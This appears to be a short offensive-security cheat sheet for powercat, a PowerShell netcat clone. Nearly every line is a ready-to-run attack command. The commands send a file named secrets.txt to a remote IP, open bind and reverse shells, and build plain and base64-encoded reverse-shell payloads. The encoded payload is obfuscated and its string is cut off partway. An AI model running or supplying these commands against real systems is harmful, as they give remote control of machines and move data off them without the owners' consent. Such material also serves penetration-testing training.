> Netcat powershell version. It’s a simple utility which reads and writes data across network connections using DNS or UDP protocol.


Copy `powercat.ps1` to current directory
```bash
cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
```

#File_Sharing 

Send a file
```powershell
powercat -c 192.168.69.123 -p 1234 -i C:\Users\hentaisalesman\Desktop\secrets.txt
```

#Shell_Access #Remote_Access

Set up a bind shell listener
```powershell
powercat -l -p 443 -e cmd.exe
```

Send a reverse shell
```powershell
powercat -c 192.168.69.123 -p 4444 -e powershell 
```

Creating a powercat stand-alone payload
```powershell
powercat -c 192.168.69.123 -p 443 -e cmd.exe -g > reverseshell.ps1
```

Executing a powercat stand-alone payload
```powershell
./reverseshell.ps1
```

Creating an encoded stand-alone payload with powercat
```powershell
powercat -c 10.11.0.69 -p 443 -e cmd.exe -ge > encodedreverseshell.ps1
```

Executing an encoded stand-alone payload using PowerShell
```powershell
powershell.exe -E ZgB1AG4AYwB0AGkAbwBuACAAUwB0AHIAZQBhAG0AMQBfAFMAZQB0AHUAcAAKAHsACgAKACAAIAAgACAAcABhAH IAYQBtACgAJABGAHUAbgBjAFMAZQB0AHUAcABWAGEAcgBzACkACgAgACAAIAAgACQAYwAsACQAbAAsACQAcAAs ACQAdAAgAD0AIAAkAEYAdQBuAGMAUwBlAHQAdQBwAFYAYQByAHMACgAgACAAIAAgAGkAZgAoACQAZwBsAG8AYg BhAGwAOgBWAGUAcgBiAG8AcwBlACkAewAkAFYAZQByAGIAbwBzAGUAIAA9ACAAJABUAHIAdQBlAH0ACgAgACAA IAAgACQARgB1AG4AYwBWAGEAcgBzACAAPQAgAEAAewB9AAoAIAAgACAAIABpAGYAKAAhACQAbAApAAoAIAAgAC AAIAB7AAoAIAAgACAAIAAgACAAJABGAHUAbgBjAFYAYQByAHMAWwAiAGwAIgBdACAAPQAgACQARgBhAGwAcwBl AAoAIAAgACAAIAAgACAAJABTAG8AYwBrAGUAdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdA BlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAGMAcABDAGwAaQBlAG4AdAAKACAAIAAgACA
```